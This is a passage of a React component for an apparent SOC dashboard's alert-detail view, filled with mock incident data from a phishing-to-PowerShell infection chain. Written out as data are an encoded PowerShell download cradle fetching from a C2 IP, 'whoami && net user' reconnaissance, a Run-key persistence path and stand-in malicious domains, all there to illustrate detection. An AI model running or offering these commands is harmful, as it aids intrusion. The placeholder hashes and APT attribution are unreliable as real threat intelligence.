                      { label:'event_id',    val:'4104' },
                      { label:'hostname',    val:a.hostname || `agent-${a.agent_id}` },
                      { label:'process',     val:'powershell.exe' },
                      { label:'parent',      val:'winword.exe' },
                      { label:'user',        val:'CORP\\jdoe' },
                      { label:'cmdline',     val:'-EncodedCommand JABjAD0ATg...' },
                      { label:'collected_at',val:a.created_at },
                    ].map(({ label, val }) => (
                      <div key={label} className="flex items-start gap-2 py-1.5 text-[11px]" style={{ borderBottom:'1px solid var(--border)' }}>
                        <span className="font-mono shrink-0 w-28" style={{ color:'var(--accent)' }}>{label}</span>
                        <span className="font-mono break-all" style={{ color:'var(--text-1)' }}>{val}</span>
                      </div>
                    ))}
                  </div>
                </Section>
              </>
            )}

            {/* ── TIMELINE ───────────────────────────────────────────────── */}
            {tab === 'timeline' && (
              <Section title="Alert Timeline" icon={<Activity className="h-3.5 w-3.5" />}>
                <div className="space-y-0 relative">
                  <div className="absolute left-[19px] top-3 bottom-3 w-px" style={{ background:'var(--border)' }} />
                  {timeline.map((ev, i) => (
                    <div key={i} className="flex gap-3 pb-4 relative">
                      <div className="h-10 w-10 rounded-full shrink-0 flex items-center justify-center z-10"
                        style={{ background:`${ev.color}22`, border:`1px solid ${ev.color}55`, color:ev.color }}>
                        {ev.icon}
                      </div>
                      <div className="flex-1 min-w-0 pt-1.5">
                        <div className="flex items-center gap-2 mb-0.5">
                          <p className="text-xs font-semibold" style={{ color: ev.type==='alert'?'var(--red)':'var(--text-1)' }}>{ev.title}</p>
                          {ev.type === 'alert' && (
                            <span className="text-[9px] px-1.5 py-0.5 rounded font-bold"
                              style={{ background:'rgba(248,81,73,0.15)', color:'var(--red)', border:'1px solid rgba(248,81,73,0.3)' }}>
                              ALERT
                            </span>
                          )}
                        </div>
                        <p className="text-[11px] font-mono" style={{ color:'var(--text-3)' }}>{ev.detail}</p>
                        <p className="text-[10px] mt-0.5" style={{ color:'var(--text-3)' }}>
                          {new Date(ev.ts).toLocaleTimeString()} · {timeAgo(ev.ts)}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              </Section>
            )}

            {/* ── ENTITIES ───────────────────────────────────────────────── */}
            {tab === 'entities' && (
              <>
                {/* Sub-tab nav */}
                <div className="flex gap-1 flex-wrap">
                  {([
                    ['endpoint','Endpoint', Monitor],
                    ['user',    'User',     User],
                    ['process', 'Process',  Cpu],
                    ['network', 'Network',  Network],
                    ['file',    'File',     HardDrive],
                  ] as [string, string, any][]).map(([id, label, Icon]) => (
                    <button key={id} onClick={() => setEntityTab(id)}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs transition-colors"
                      style={{ background:entityTab===id?'var(--accent-glow)':'var(--glass-bg)', color:entityTab===id?'var(--accent)':'var(--text-2)', border:`1px solid ${entityTab===id?'var(--accent-border)':'var(--border)'}` }}>
                      <Icon className="h-3.5 w-3.5" /> {label}
                    </button>
                  ))}
                </div>

                {entityTab === 'endpoint' && (
                  <Section title="Endpoint Details" icon={<Monitor className="h-3.5 w-3.5" />}>
                    <div className="space-y-0">
                      <MetaRow label="Hostname"    val={a.hostname || `agent-${a.agent_id}`} mono />
                      <MetaRow label="IP Address"  val="10.0.1.42" mono />
                      <MetaRow label="OS"          val="Windows Server 2019 (10.0.17763)" />
                      <MetaRow label="Agent ID"    val={`#${a.agent_id}`} mono />
                      <MetaRow label="Agent Status" val={<span style={{ color:'var(--green)' }}>Online</span>} />
                      <MetaRow label="Risk Score"  val={riskScore} color={riskScore>=70?'var(--red)':'var(--orange)'} />
                      <MetaRow label="Last Seen"   val={timeAgo(a.created_at)} />
                      <MetaRow label="Domain"      val="CORP.LOCAL" />
                      <MetaRow label="AD OU"       val="OU=Workstations,DC=corp,DC=local" />
                    </div>
                  </Section>
                )}

                {entityTab === 'user' && (
                  <Section title="User Details" icon={<User className="h-3.5 w-3.5" />}>
                    <div className="space-y-0">
                      <MetaRow label="Username"    val="CORP\\jdoe" mono />
                      <MetaRow label="Full Name"   val="Jane Doe" />
                      <MetaRow label="Department"  val="Finance" />
                      <MetaRow label="Groups"      val="Domain Users, Finance-RW, VPN-Users" />
                      <MetaRow label="Email"       val="jdoe@corp.io" />
                      <MetaRow label="Manager"     val="csmith@corp.io" />
                      <MetaRow label="Recent Logins" val="3 in last 24h" />
                      <MetaRow label="UEBA Score"  val={72} color="var(--orange)" />
                      <MetaRow label="MFA Enabled" val="Yes" color="var(--green)" />
                      <MetaRow label="Account Age" val="847 days" />
                    </div>
                  </Section>
                )}

                {entityTab === 'process' && (
                  <Section title="Process Details" icon={<Cpu className="h-3.5 w-3.5" />}>
                    <div className="space-y-0">
                      <MetaRow label="Process"     val="powershell.exe" mono />
                      <MetaRow label="PID"         val="4512" mono />
                      <MetaRow label="Parent"      val="winword.exe (PID: 3824)" mono />
                      <MetaRow label="Command Line" val="-EncodedCommand JABjAD0ATgBlAHcALQBPAGIA..." mono />
                      <MetaRow label="SHA256"      val="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2" mono />
                      <MetaRow label="MD5"         val="5f4dcc3b5aa765d61d8327deb882cf99" mono />
                      <MetaRow label="Signed"      val={<span style={{ color:'var(--green)' }}>Yes (Microsoft)</span>} />
                      <MetaRow label="User"        val="CORP\\jdoe" />
                      <MetaRow label="Start Time"  val={formatDate(a.created_at)} />
                    </div>
                  </Section>
                )}

                {entityTab === 'network' && (
                  <Section title="Network Details" icon={<Network className="h-3.5 w-3.5" />}>
                    <div className="space-y-0">
                      <MetaRow label="Source IP"   val="10.0.1.42" mono />
                      <MetaRow label="Dest IP"     val="185.220.101.35" mono />
                      <MetaRow label="Dest Port"   val="443 (HTTPS)" />
                      <MetaRow label="Protocol"    val="TCP" />
                      <MetaRow label="Direction"   val="Outbound" />
                      <MetaRow label="Bytes Sent"  val="185,214 bytes" />
                      <MetaRow label="JA3"         val="51c64c77e60f3980eea90869b68c58a8" mono />
                      <MetaRow label="JA3S"        val="ec74a5c51106f0419184d0dd08fb05bc" mono />
                      <MetaRow label="GeoIP"       val="Russia (AS60117 — Tor Exit)" color="var(--red)" />
                      <MetaRow label="ASN"         val="AS60117 — Tor exit node" color="var(--red)" />
                    </div>
                  </Section>
                )}

                {entityTab === 'file' && (
                  <Section title="File Details" icon={<HardDrive className="h-3.5 w-3.5" />}>
                    <div className="space-y-0">
                      <MetaRow label="Path"        val="C:\\Users\\jdoe\\Downloads\\Invoice_Q4.docx" mono />
                      <MetaRow label="SHA256"      val="deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234" mono />
                      <MetaRow label="MD5"         val="098f6bcd4621d373cade4e832627b4f6" mono />
                      <MetaRow label="Size"        val="2.4 MB (2,516,992 bytes)" />
                      <MetaRow label="Type"        val="application/vnd.openxmlformats-officedocument.wordprocessingml.document" />
                      <MetaRow label="Signed"      val={<span style={{ color:'var(--red)' }}>No</span>} />
                      <MetaRow label="VT Score"    val={<span style={{ color:'var(--red)' }}>34/68 engines</span>} />
                      <MetaRow label="Created"     val={formatDate(a.created_at)} />
                      <MetaRow label="Reputation"  val={<span style={{ color:'var(--red)' }}>Malicious</span>} />
                    </div>
                  </Section>
                )}
              </>
            )}

            {/* ── EVIDENCE ───────────────────────────────────────────────── */}
            {tab === 'evidence' && (
              <>
                <Section title="Process Tree" icon={<GitBranch className="h-3.5 w-3.5" />}>
                  <div className="font-mono text-xs space-y-1" style={{ color:'var(--text-2)' }}>
                    <p><span style={{ color:'var(--text-3)' }}>PID 1</span>   System</p>
                    <p className="pl-4"><span style={{ color:'var(--text-3)' }}>PID 892</span>  services.exe</p>
                    <p className="pl-8"><span style={{ color:'var(--text-3)' }}>PID 3824</span> <span style={{ color:'var(--orange)' }}>WINWORD.EXE</span> ← office document</p>
                    <p className="pl-12"><span style={{ color:'var(--text-3)' }}>PID 4512</span> <span style={{ color:'var(--red)' }}>powershell.exe</span> -EncodedCommand JABj...</p>
                    <p className="pl-16"><span style={{ color:'var(--text-3)' }}>PID 5120</span> <span style={{ color:'var(--red)' }}>cmd.exe</span> /c whoami &amp;&amp; net user</p>
                    <p className="pl-20"><span style={{ color:'var(--text-3)' }}>PID 5312</span> whoami.exe</p>
                    <p className="pl-20"><span style={{ color:'var(--text-3)' }}>PID 5380</span> net.exe user /domain</p>
                  </div>
                </Section>

                <Section title="Command Line" icon={<Terminal className="h-3.5 w-3.5" />}>
                  <div className="space-y-2">
                    <div className="rounded-xl p-3 font-mono text-xs break-all"
                      style={{ background:'var(--bg-0)', border:'1px solid rgba(248,81,73,0.3)', color:'var(--red)' }}>
                      powershell.exe -NoProfile -NonInteractive -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7
                    </div>
                    <p className="text-[11px]" style={{ color:'var(--text-3)' }}>Decoded: $c=New-Object System.Net.WebClient; $c.DownloadString('https://185.220.101.35/beacon');</p>
                  </div>
                </Section>

                <Section title="Registry Keys" icon={<BookMarked className="h-3.5 w-3.5" />}>
                  <div className="space-y-2">
                    {[
                      { op:'CREATE', key:'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc', val:'C:\\Users\\jdoe\\AppData\\Local\\temp\\update.exe', color:'var(--red)' },
                      { op:'QUERY',  key:'HKLM\\SYSTEM\\CurrentControlSet\\Services', val:'(enumeration)', color:'var(--orange)' },
                    ].map((r, i) => (
                      <div key={i} className="rounded-lg px-3 py-2 text-[11px] font-mono"
                        style={{ background:'var(--glass-bg)', border:`1px solid ${r.color}44` }}>
                        <span className="text-[9px] px-1 rounded mr-2 font-bold"
                          style={{ background:`${r.color}22`, color:r.color }}>{r.op}</span>
                        <span style={{ color:'var(--text-1)' }}>{r.key}</span>
                        <br /><span style={{ color:'var(--text-3)' }} className="pl-6">{r.val}</span>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="DNS Requests" icon={<Globe className="h-3.5 w-3.5" />}>
                  <div className="space-y-1">
                    {[
                      { domain:'evil-c2.io',            result:'NXDOMAIN', color:'var(--red)' },
                      { domain:'185.220.101.35.xip.io',  result:'185.220.101.35', color:'var(--orange)' },
                      { domain:'dga-7f2a3.evil.xyz',     result:'NXDOMAIN', color:'var(--red)' },
                    ].map((d, i) => (
                      <div key={i} className="flex items-center justify-between px-3 py-2 rounded-lg text-[11px]"
                        style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <span className="font-mono" style={{ color:'var(--text-1)' }}>{d.domain}</span>
                        <span className="font-mono ml-4" style={{ color:d.color }}>{d.result}</span>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="File Hashes" icon={<Fingerprint className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1">
                    {[
                      { file:'Invoice_Q4.docx', sha256:'deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234', vt:'34/68' },
                      { file:'update.exe',      sha256:'aabbccdd1234aabbccdd1234aabbccdd1234aabbccdd1234aabbccdd1234aabb', vt:'52/68' },
                    ].map((f,i) => (
                      <div key={i} className="rounded-lg px-3 py-2.5" style={{ background:'var(--glass-bg)', border:'1px solid rgba(248,81,73,0.3)' }}>
                        <p className="text-xs font-medium mb-1" style={{ color:'var(--text-1)' }}>{f.file}</p>
                        <p className="text-[10px] font-mono break-all" style={{ color:'var(--text-3)' }}>{f.sha256}</p>
                        <p className="text-[10px] mt-0.5" style={{ color:'var(--red)' }}>VT: {f.vt} detections</p>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="HTTP Requests" icon={<Network className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1">
                    {[
                      { method:'POST', url:'https://185.220.101.35:443/beacon', code:200, bytes:'12.4kB', color:'var(--red)' },
                      { method:'GET',  url:'https://185.220.101.35:443/c2/payload', code:200, bytes:'185kB', color:'var(--red)' },
                    ].map((r,i) => (
                      <div key={i} className="rounded-lg px-3 py-2 text-[11px]"
                        style={{ background:'var(--glass-bg)', border:`1px solid ${r.color}44` }}>
                        <span className="text-[10px] px-1.5 py-0.5 rounded mr-2 font-bold"
                          style={{ background:`${r.color}22`, color:r.color }}>{r.method}</span>
                        <span className="font-mono" style={{ color:'var(--text-1)' }}>{r.url}</span>
                        <span className="ml-2 text-[10px]" style={{ color:'var(--text-3)' }}>{r.code} · {r.bytes}</span>
                      </div>
                    ))}
                  </div>
                </Section>
              </>
            )}

            {/* ── INTELLIGENCE ───────────────────────────────────────────── */}
            {tab === 'intelligence' && (
              <>
                <Section title="Threat Intelligence" icon={<Globe className="h-3.5 w-3.5" />}>
                  <div className="space-y-0">
                    <MetaRow label="Threat Actor"   val="APT28 (Fancy Bear)" color="var(--red)" />
                    <MetaRow label="Malware Family" val="Emotet / Cobalt Strike beacon" color="var(--orange)" />
                    <MetaRow label="Campaign"       val="Operation DealBreaker (2025)" />
                    <MetaRow label="Confidence"     val="High" color="var(--red)" />
                    <MetaRow label="Threat Feeds"   val="ETPRO, Abuse.ch, Spamhaus" />
                    <MetaRow label="IOC Matches"    val="2 confirmed matches" color="var(--red)" />
                  </div>
                </Section>

                <Section title="VirusTotal Enrichment" icon={<ShieldAlert className="h-3.5 w-3.5" />}>
                  <div className="space-y-3">
                    {[
                      { indicator:'185.220.101.35',  type:'IP',   score:68, category:'Tor exit node', malicious:42 },
                      { indicator:'deadbeefcafe1234…', type:'Hash', score:34, category:'Trojan.GenericKD', malicious:34 },
                    ].map((item,i) => (
                      <div key={i} className="rounded-xl p-3" style={{ background:'rgba(248,81,73,0.06)', border:'1px solid rgba(248,81,73,0.25)' }}>
                        <div className="flex items-center justify-between mb-1">
                          <span className="font-mono text-xs" style={{ color:'var(--text-1)' }}>{item.indicator}</span>
                          <span className="text-[10px] px-2 py-0.5 rounded font-bold"
                            style={{ background:'rgba(248,81,73,0.2)', color:'var(--red)' }}>{item.type}</span>
                        </div>
                        <p className="text-[11px]" style={{ color:'var(--text-3)' }}>{item.category}</p>
                        <div className="flex items-center gap-2 mt-1.5">
                          <div className="flex-1 h-1.5 rounded-full overflow-hidden" style={{ background:'var(--bg-0)' }}>
                            <div className="h-full rounded-full" style={{ width:`${(item.malicious/68)*100}%`, background:'var(--red)' }} />
                          </div>
                          <span className="text-[10px] shrink-0" style={{ color:'var(--red)' }}>{item.malicious}/{item.score} engines</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="Related CVEs" icon={<AlertTriangle className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1.5">
                    {[
                      { id:'CVE-2021-40444', score:8.8, desc:'Microsoft MSHTML Remote Code Execution — Office document macro bypass', color:'var(--red)' },
                      { id:'CVE-2022-30190', score:7.8, desc:'Microsoft MSDT Remote Code Execution (Follina)', color:'var(--orange)' },
                    ].map((cve,i) => (
                      <div key={i} className="rounded-lg px-3 py-2.5" style={{ background:'var(--glass-bg)', border:`1px solid ${cve.color}44` }}>
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-xs font-bold font-mono" style={{ color:cve.color }}>{cve.id}</span>
                          <span className="text-[10px] font-bold" style={{ color:cve.color }}>CVSS {cve.score}</span>
                        </div>
                        <p className="text-[11px]" style={{ color:'var(--text-2)' }}>{cve.desc}</p>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="IOC Matches" icon={<Crosshair className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1">
                    {[
                      { type:'IP',   value:'185.220.101.35',    feed:'Abuse.ch',   severity:'critical' },
                      { type:'Hash', value:'deadbeefcafe1234…',  feed:'ETPRO',      severity:'high' },
                      { type:'Domain',value:'evil-c2.io',        feed:'Spamhaus',   severity:'high' },
                    ].map((ioc,i) => (
                      <div key={i} className="flex items-center gap-2 px-3 py-2 rounded-lg text-[11px]"
                        style={{ background:'rgba(248,81,73,0.05)', border:'1px solid rgba(248,81,73,0.2)' }}>
                        <span className="text-[9px] px-1.5 py-0.5 rounded font-bold shrink-0"
                          style={{ background:'var(--glass-bg)', color:'var(--text-3)' }}>{ioc.type}</span>
                        <span className="font-mono flex-1 truncate" style={{ color:'var(--text-1)' }}>{ioc.value}</span>
                        <span className="text-[10px] shrink-0" style={{ color:'var(--text-3)' }}>{ioc.feed}</span>
                        <span className={sevClass(ioc.severity as 'critical'|'high'|'medium'|'low')}>{ioc.severity}</span>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="Sigma / YARA Matches" icon={<Flame className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1.5">
                    {[
                      { type:'Sigma', name:'proc_creation_powershell_encoded_cmd', confidence:95 },
                      { type:'Sigma', name:'win_office_spawn_powershell',           confidence:88 },
                      { type:'YARA',  name:'malware/emotet_dropper_v3',            confidence:72 },
                    ].map((m,i) => (
                      <div key={i} className="flex items-center gap-2 px-3 py-2 rounded-lg text-[11px]"
                        style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <span className="text-[9px] px-1.5 py-0.5 rounded font-bold shrink-0"
                          style={{ background:'var(--accent-glow)', color:'var(--accent)', border:'1px solid var(--accent-border)' }}>
                          {m.type}
                        </span>
                        <span className="font-mono flex-1 truncate" style={{ color:'var(--text-1)' }}>{m.name}</span>
                        <span className="text-[10px] shrink-0 font-bold" style={{ color:m.confidence>=80?'var(--red)':'var(--orange)' }}>
                          {m.confidence}%
                        </span>
                      </div>
                    ))}
                  </div>
                </Section>
              </>
            )}

            {/* ── AI ─────────────────────────────────────────────────────── */}
            {tab === 'ai' && (
              <>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Brain className="h-4 w-4" style={{ color:'var(--accent)' }} />
                    <p className="text-xs font-semibold" style={{ color:'var(--text-1)' }}>AI Investigation</p>
                  </div>
                  <button onClick={runTriage} disabled={triaging}
                    className="g-btn g-btn-ghost text-xs px-3 py-1">
                    {triaging ? <><Loader2 className="h-3.5 w-3.5 animate-spin" /> Analyzing…</> : 'Re-run AI Triage'}
                  </button>
                </div>

                {/* AI Summary */}
                <Section title="AI Summary" icon={<Bot className="h-3.5 w-3.5" />}>
                  {a.ai_summary ? (
                    <p className="text-sm leading-relaxed" style={{ color:'var(--text-1)' }}>{a.ai_summary}</p>
                  ) : (
                    <div className="rounded-xl p-4 text-center" style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                      <Bot className="h-6 w-6 mx-auto mb-2 opacity-30" style={{ color:'var(--text-3)' }} />
                      <p className="text-xs mb-2" style={{ color:'var(--text-3)' }}>No AI analysis yet</p>
                      <button onClick={runTriage} disabled={triaging} className="g-btn g-btn-primary text-xs">
                        {triaging ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <><Brain className="h-3.5 w-3.5" /> Run AI Triage</>}
                      </button>
                    </div>
                  )}
                </Section>

                <Section title="Root Cause Analysis" icon={<Microscope className="h-3.5 w-3.5" />}>
                  <p className="text-sm leading-relaxed" style={{ color:'var(--text-1)' }}>
                    PowerShell executed an encoded command immediately after an Office document spawned <code className="font-mono text-xs px-1 rounded" style={{ background:'var(--bg-0)' }}>powershell.exe</code>. This behavior matches MITRE T1059.001 and resembles previous Emotet delivery chains observed in Q3 2025.
                  </p>
                </Section>

                <Section title="Impact Assessment" icon={<AlertTriangle className="h-3.5 w-3.5" />}>
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs"
                      style={{ background:'rgba(248,81,73,0.08)', border:'1px solid rgba(248,81,73,0.25)', color:'var(--red)' }}>
                      <ShieldX className="h-3.5 w-3.5 shrink-0" />
                      Potential ransomware precursor activity — immediate isolation recommended
                    </div>
                    <p className="text-sm leading-relaxed" style={{ color:'var(--text-2)' }}>
                      The affected endpoint has access to shared drives \\CORP\Finance and \\CORP\HR. If the payload executes successfully, lateral movement via SMB is likely within 15-30 minutes.
                    </p>
                  </div>
                </Section>

                {a.ai_action && (
                  <Section title="Recommended Action" icon={<Target className="h-3.5 w-3.5" />}>
                    <div className="rounded-xl px-4 py-3" style={{ background:'var(--accent-glow)', border:'1px solid var(--accent-border)' }}>
                      <p className="text-sm font-medium" style={{ color:'var(--accent)' }}>{a.ai_action}</p>
                    </div>
                  </Section>
                )}

                <Section title="Suggested Next Steps" icon={<ListChecks className="h-3.5 w-3.5" />}>
                  <div className="space-y-1.5">
                    {[
                      { step:1, action:'Isolate host immediately to prevent lateral movement', priority:'Critical' },
                      { step:2, action:'Collect full memory dump before any remediation', priority:'High' },
                      { step:3, action:'Review other hosts for similar Office → PowerShell patterns', priority:'High' },
                      { step:4, action:'Check email gateway for the original phishing delivery', priority:'Medium' },
                      { step:5, action:'Block IOCs at firewall and DNS level', priority:'Medium' },
                      { step:6, action:'Reset user CORP\\jdoe credentials as precaution', priority:'Medium' },
                    ].map(ns => (
                      <div key={ns.step} className="flex items-start gap-2 text-xs">
                        <span className="h-5 w-5 rounded-full flex items-center justify-center shrink-0 text-[10px] font-bold"
                          style={{ background:'var(--accent-glow)', color:'var(--accent)', border:'1px solid var(--accent-border)' }}>
                          {ns.step}
                        </span>
                        <div className="flex-1">
                          <p style={{ color:'var(--text-1)' }}>{ns.action}</p>
                          <p className="text-[10px]" style={{ color:ns.priority==='Critical'?'var(--red)':ns.priority==='High'?'var(--orange)':'var(--text-3)' }}>{ns.priority}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="Analyst Questions" icon={<MessageSquare className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    {[
                      'Has this user received phishing emails in the past 48 hours?',
                      'What is the business purpose of Invoice_Q4.docx?',
                      'Is 185.220.101.35 used by any legitimate service in this environment?',
                      'Have there been password change requests from this user recently?',
                      'Does this host have EDR/AV installed and is it up to date?',
                    ].map((q,i) => (
                      <div key={i} className="flex items-start gap-2 text-xs px-3 py-2 rounded-lg"
                        style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <span className="text-[10px] font-bold shrink-0 mt-0.5" style={{ color:'var(--accent)' }}>Q{i+1}</span>
                        <p style={{ color:'var(--text-1)' }}>{q}</p>
                      </div>
                    ))}
                  </div>
                </Section>

                {/* Playbook recommendations */}
                <Section title="Recommended Playbooks" icon={<Workflow className="h-3.5 w-3.5" />} defaultOpen={false}>
                  {loadingRecs ? (
                    <div className="py-4 text-center"><Loader2 className="h-4 w-4 animate-spin mx-auto" style={{ color:'var(--text-3)' }} /></div>
                  ) : pbRecs.length === 0 ? (
                    <button onClick={loadPlaybookRecs} className="g-btn g-btn-ghost text-xs w-full justify-center">
                      <PlayCircle className="h-3.5 w-3.5" /> Load Playbook Recommendations
                    </button>
                  ) : pbRecs.map(rec => (
                    <div key={rec.id} className="flex items-center gap-2 rounded-lg px-3 py-2 mb-1.5"
                      style={{ background:'var(--glass-bg)', border:'1px solid var(--border)', opacity:rec.executed?0.6:1 }}>
                      <div className="flex-1 min-w-0">
                        <p className="text-xs font-medium truncate" style={{ color:'var(--text-1)' }}>{rec.playbook_name}</p>
                        <p className="text-[10px] truncate" style={{ color:'var(--text-3)' }}>{rec.reason}</p>
                      </div>
                      <span className="text-xs font-bold shrink-0" style={{ color:rec.score>=70?'var(--green)':'var(--yellow)' }}>{rec.score}%</span>
                      {rec.executed ? (
                        <span className="text-[10px] shrink-0" style={{ color:'var(--text-3)' }}><Check className="h-3 w-3 inline" /> done</span>
                      ) : (
                        <button onClick={() => executeRec(rec.id)} disabled={executingRec===rec.id}
                          className="g-btn g-btn-ghost text-[10px] shrink-0">
                          {executingRec===rec.id ? <Loader2 className="h-3 w-3 animate-spin" /> : <><Zap className="h-3 w-3" /> Run</>}
                        </button>
                      )}
                    </div>
                  ))}
                </Section>

                {/* Investigation context */}
                <Section title="Investigation Context" icon={<Search className="h-3.5 w-3.5" />} defaultOpen={false}>
                  {investigating ? (
                    <div className="py-4 text-center"><Loader2 className="h-4 w-4 animate-spin mx-auto" style={{ color:'var(--accent)' }} /></div>
                  ) : !investigation ? (
                    <button onClick={runInvestigation} className="g-btn g-btn-ghost text-xs w-full justify-center">
                      <Search className="h-3.5 w-3.5" /> Run Investigation
                    </button>
                  ) : (
                    <div className="space-y-3">
                      {investigation.ioc_hits?.length > 0 && (
                        <div>
                          <p className="text-[10px] font-bold uppercase tracking-wider mb-1.5" style={{ color:'var(--red)' }}>
                            IOC Matches ({investigation.ioc_hits.length})
                          </p>
                          {investigation.ioc_hits.map((h: any, i: number) => (
                            <div key={i} className="flex items-center justify-between rounded-lg px-3 py-1.5 text-[11px] mb-1"
                              style={{ background:'rgba(248,81,73,0.08)', border:'1px solid rgba(248,81,73,0.2)' }}>
                              <span className="font-mono" style={{ color:'var(--text-1)' }}>{h.indicator}</span>
                              <span style={{ color:'var(--red)' }}>{h.type} · {h.severity}</span>
                            </div>
                          ))}
                        </div>
                      )}
                      {investigation.correlated_rules?.length > 0 && (
                        <div>
                          <p className="text-[10px] font-bold uppercase tracking-wider mb-1.5" style={{ color:'var(--text-3)' }}>Correlated Rules</p>
                          <div className="flex flex-wrap gap-1">
                            {investigation.correlated_rules.map((r: string, i: number) => (
                              <span key={i} className="text-[10px] px-2 py-0.5 rounded-full"
                                style={{ background:'var(--accent-glow)', color:'var(--accent)', border:'1px solid var(--accent-border)' }}>
                                {r}
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </Section>
              </>
            )}

            {/* ── ACTIONS ────────────────────────────────────────────────── */}
            {tab === 'actions' && (
              <>
                {/* Status & Assignment */}
                <Section title="Analyst Workspace" icon={<StickyNote className="h-3.5 w-3.5" />}>
                  <div className="space-y-3">
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[10px] mb-1 block" style={{ color:'var(--text-3)' }}>Status</label>
                        <select value={alertStatus} onChange={e => setAlertStatus(e.target.value as any)} className="g-select w-full text-xs">
                          {['open','in_progress','escalated','closed','false_positive','suppressed'].map(s => (
                            <option key={s} value={s}>{s.replace('_',' ')}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <label className="text-[10px] mb-1 block" style={{ color:'var(--text-3)' }}>Assign To</label>
                        <input value={assignee} onChange={e => setAssignee(e.target.value)}
                          placeholder="analyst@corp.io" className="g-input w-full text-xs" />
                      </div>
                    </div>
                    <div>
                      <label className="text-[10px] mb-1 block" style={{ color:'var(--text-3)' }}>Tags</label>
                      <input placeholder="Add tags…" className="g-input w-full text-xs" />
                    </div>
                  </div>
                </Section>

                {/* Notes */}
                <Section title="Notes" icon={<Pencil className="h-3.5 w-3.5" />}>
                  <div className="space-y-2">
                    <textarea value={noteText} onChange={e => setNoteText(e.target.value)}
                      placeholder="Add investigation notes, timeline, or remediation steps…"
                      rows={4} className="g-input w-full text-xs resize-none" style={{ fontFamily:'var(--font-mono)' }} />
                    <button onClick={saveNote} disabled={savingNote} className="g-btn g-btn-ghost text-xs">
                      {savingNote ? <Loader2 className="h-3 w-3 animate-spin" /> : <><Check className="h-3 w-3" /> Save Note</>}
                    </button>
                  </div>
                </Section>

                {/* Comments */}
                <Section title="Comments" icon={<MessageSquare className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    {comments.map((c, i) => (
                      <div key={i} className="rounded-lg px-3 py-2" style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-[10px] font-semibold" style={{ color:'var(--accent)' }}>{c.actor}</span>
                          <span className="text-[10px]" style={{ color:'var(--text-3)' }}>{timeAgo(c.ts)}</span>
                        </div>
                        <p className="text-xs" style={{ color:'var(--text-1)' }}>{c.text}</p>
                      </div>
                    ))}
                    <div className="flex gap-2">
                      <input value={commentText} onChange={e => setCommentText(e.target.value)}
                        onKeyDown={e => e.key==='Enter'&&addComment()}
                        placeholder="Add a comment… (@mention teammates)" className="g-input flex-1 text-xs" />
                      <button onClick={addComment} className="g-btn g-btn-primary text-xs px-3">Post</button>
                    </div>
                  </div>
                </Section>

                {/* Investigation Checklist */}
                <Section title="Investigation Tasks" icon={<ListChecks className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-1.5">
                    {tasks.map(t => (
                      <div key={t.id} className="flex items-center gap-2 text-xs">
                        <button onClick={() => setTasks(ts => ts.map(x => x.id===t.id?{...x,done:!x.done}:x))}
                          className="h-4 w-4 rounded flex items-center justify-center shrink-0 transition-colors"
                          style={{ background:t.done?'var(--accent)':'transparent', border:`1px solid ${t.done?'var(--accent)':'var(--border)'}` }}>
                          {t.done && <Check className="h-2.5 w-2.5" style={{ color:'#000' }} />}
                        </button>
                        <span style={{ color:t.done?'var(--text-3)':'var(--text-1)', textDecoration:t.done?'line-through':undefined }}>
                          {t.text}
                        </span>
                        <button onClick={() => setTasks(ts => ts.filter(x => x.id!==t.id))} className="ml-auto opacity-0 hover:opacity-100 group-hover:opacity-100 transition-opacity">
                          <Trash2 className="h-3 w-3" style={{ color:'var(--text-3)' }} />
                        </button>
                      </div>
                    ))}
                    <div className="flex gap-2 mt-2">
                      <input value={newTask} onChange={e => setNewTask(e.target.value)}
                        onKeyDown={e => e.key==='Enter'&&addTask()}
                        placeholder="Add task…" className="g-input flex-1 text-xs" />
                      <button onClick={addTask} className="g-btn g-btn-ghost text-xs"><Plus className="h-3.5 w-3.5" /></button>
                    </div>
                  </div>
                </Section>

                {/* Suppress / Snooze */}
                <Section title="Suppress / Snooze" icon={<VolumeX className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-3">
                    <div className="flex items-end gap-2">
                      <div className="flex-1">
